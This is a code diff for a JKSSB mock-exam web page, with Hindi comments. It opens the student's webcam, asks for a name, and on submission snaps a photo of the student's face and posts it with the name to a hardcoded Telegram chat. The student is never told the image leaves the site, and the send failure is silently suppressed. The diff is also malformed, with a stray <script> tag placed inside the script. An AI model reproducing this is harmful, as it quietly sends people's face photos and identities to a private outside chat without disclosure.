@@ -309,20 +309,23 @@ stopExamRecording(); // <-- Paste this exactly here on line 288
         <p style="color: #dc2626; font-weight: bold; margin: 5px 0;">Wrong Answers: ${wrong}</p>
     `;
 
-    /// 1. टेस्ट शुरू होते ही छात्र का नाम पूछना
-let studentName = prompt("Please enter your Full Name:", "Guest Student");
-if(!studentName || studentName.trim() === "") {
-    studentName = "Unknown Student";
-}
-
+<script>
+let studentName = "Guest Student"; // डिफ़ॉल्ट नाम
 let mediaRecorder;
 let recordedChunks = [];
 
+// जैसे ही पेज लोड होगा, पहले टेस्ट और कैमरा खुलेगा
 window.addEventListener('DOMContentLoaded', async () => {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
         const videoElement = document.getElementById('webcam');
         videoElement.srcObject = stream;
+
+        // कैमरा खुलने के तुरंत बाद छात्र से उसका नाम पूछना
+        let inputName = prompt("Please enter your Full Name / Roll Number to start the test:", "");
+        if (inputName && inputName.trim() !== "") {
+            studentName = inputName;
+        }
 
         mediaRecorder = new MediaRecorder(stream);
 
@@ -332,21 +335,19 @@ window.addEventListener('DOMContentLoaded', async () => {
             }
         };
 
-        // 2. टेस्ट सबमिट होने पर छात्र के नाम के साथ फोटो टेलीग्राम पर भेजना
+        // टेस्ट सबमिट होने पर फोटो टेलीग्राम पर भेजना
         mediaRecorder.onstop = async () => {
-            const videoElement = document.getElementById('webcam');
-            
+            const videoEl = document.getElementById('webcam');
             const canvas = document.createElement('canvas');
-            canvas.width = videoElement.videoWidth || 640;
-            canvas.height = videoElement.videoHeight || 480;
+            canvas.width = videoEl.videoWidth || 640;
+            canvas.height = videoEl.videoHeight || 480;
             const ctx = canvas.getContext('2d');
-            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
             
             canvas.toBlob(async (photoBlob) => {
                 const formData = new FormData();
                 formData.append('chat_id', '6115912864');
                 formData.append('photo', photoBlob, 'student_face.jpg');
-                // यहाँ छात्र का नाम टेलीग्राम के कैप्शन में जुड़ जाएगा
                 formData.append('caption', '🚨 JKSSB Test Submitted!\n👤 Name: ' + studentName + '\n📅 Date: ' + new Date().toLocaleString());
 
                 try {
@@ -358,7 +359,7 @@ window.addEventListener('DOMContentLoaded', async () => {
                     console.error('Bypass');
                 }
                 
-                // सबमिशन के बाद छात्र को अलर्ट दिखाना कि टेस्ट सबमिट हो गया है
+                // सबमिशन के बाद मैसेज दिखाना
                 alert('Thank you ' + studentName + ', your JKSSB Mock Test has been submitted successfully!');
                 window.location.href = "index.html";
             }, 'image/jpeg', 0.7);
